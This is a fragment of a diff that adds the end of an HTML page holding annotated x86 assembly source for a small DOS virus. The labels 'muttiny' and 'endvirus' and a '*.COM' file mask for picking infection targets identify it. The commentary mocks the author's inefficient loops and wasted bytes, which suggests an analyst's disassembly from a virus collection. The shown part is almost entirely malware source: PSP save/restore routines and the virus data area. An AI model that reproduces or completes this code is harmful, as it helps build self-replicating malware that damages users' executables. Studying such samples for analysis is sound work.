+;       mov cx, 50h
+; since the author decided to use words instead of bytes.
+                mov     cx,100h
+                push    si
+; The loop below is dumb.  A simple rep movsw statement would have
+; sufficed.  Instead, countless bytes are wasted on the loop.
+storebytes:
+                mov     ax,[di]
+                mov     word ptr [si+pspstore],ax
+                add     si,2
+                add     di,2
+                loop    storebytes
+                pop     si
+                ret
+
+restorepsp:
+                mov     di,0
+                mov     cx,100h                 ; Restore 200h bytes
+                push    si
+restorebytes:
+                mov     ax,word ptr [si+pspstore]
+                mov     [di],ax
+                add     si,2
+                add     di,2
+                loop    restorebytes
+                pop     si
+                ret
+
+oldjmp          dw      0
+filemask        db      '*.COM',0
+idontknow1      db      66h                     ; Waste of one byte
+buffer          db      00h, 00h, 01h           ; Waste of three bytes
+storejmp        dw      0                       ; Waste of two bytes
+; endvirus should be before idontknow1, thereby saving six bytes.
+endvirus:
+idontknow2      db      ?, ?
+pspstore        db      200 dup (?)             ; Should actually be
+idontknow3      db      2ch dup (?)             ; 100h bytes long.
+veryend:                                        ; End of encryption
+muttiny         ends
+                end     start
+
+</pre>
+</html>
+                                                                            DA
